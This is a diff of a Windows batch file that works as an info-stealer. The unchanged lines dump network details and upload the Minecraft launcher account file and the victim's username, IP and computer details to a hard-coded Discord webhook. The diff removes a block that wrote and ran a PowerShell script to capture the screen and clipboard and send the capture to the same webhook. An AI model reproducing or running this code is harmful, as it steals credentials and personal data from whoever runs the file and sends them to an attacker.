@@ -1,8 +1,6 @@
 @echo off
 set webhook=https://discord.com/api/webhooks/935046615843106816/_mZ1X9R_ZG-tv8Zu1nQ6Fefihsdt-AUNVzFhOUjjhShOiQ0gnXiv9xzFht5VzLraNSot
 
-
-
 @echo off
 
 :-------------------------------------
@@ -72,32 +70,6 @@ ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt
 netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt
 
 if exist %userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json %web% && goto end
-
-echo $SERDO = Get-Clipboard >%userprofile%\AppData\Local\Temp\test.ps1
-echo function Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
-echo { >>%userprofile%\AppData\Local\Temp\test.ps1
-echo     begin { >>%userprofile%\AppData\Local\Temp\test.ps1
-echo         Add-Type -AssemblyName System.Drawing, System.Windows.Forms >>%userprofile%\AppData\Local\Temp\test.ps1
-echo         Add-Type -AssemblyName System.Drawing >>%userprofile%\AppData\Local\Temp\test.ps1
-echo             Where-Object { $_.FormatDescription -eq "JPEG" } >>%userprofile%\AppData\Local\Temp\test.ps1
-echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
-echo     process { >>%userprofile%\AppData\Local\Temp\test.ps1
-echo         Start-Sleep -Milliseconds 44 >>%userprofile%\AppData\Local\Temp\test.ps1
-echo         Start-Sleep -Milliseconds 550 >>%userprofile%\AppData\Local\Temp\test.ps1
-echo         $ep = New-Object Drawing.Imaging.EncoderParameters   >>%userprofile%\AppData\Local\Temp\test.ps1
-echo         $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture" >>%userprofile%\AppData\Local\Temp\test.ps1
-echo         $bitmap.Save("${screenCapturePathBase}.jpg", $jpegCodec, $ep) >>%userprofile%\AppData\Local\Temp\test.ps1
-echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
-echo }							 >>%userprofile%\AppData\Local\Temp\test.ps1			
-echo Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
-echo Set-Clipboard -Value $SERDO >>%userprofile%\AppData\Local\Temp\test.ps1
-echo $result  = "%webhook%"  >>%userprofile%\AppData\Local\Temp\test.ps1
-echo $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture.jpg"	 >>%userprofile%\AppData\Local\Temp\test.ps1															
-echo curl.exe -i -F file=@"$screenCapturePathBase" $result >>%userprofile%\AppData\Local\Temp\test.ps1
-timeout 1 >NUL
-Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\test.ps1 && del %userprofile%\AppData\Local\Temp\test.ps1 
-
-
 
 curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```User %username% : %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%
 
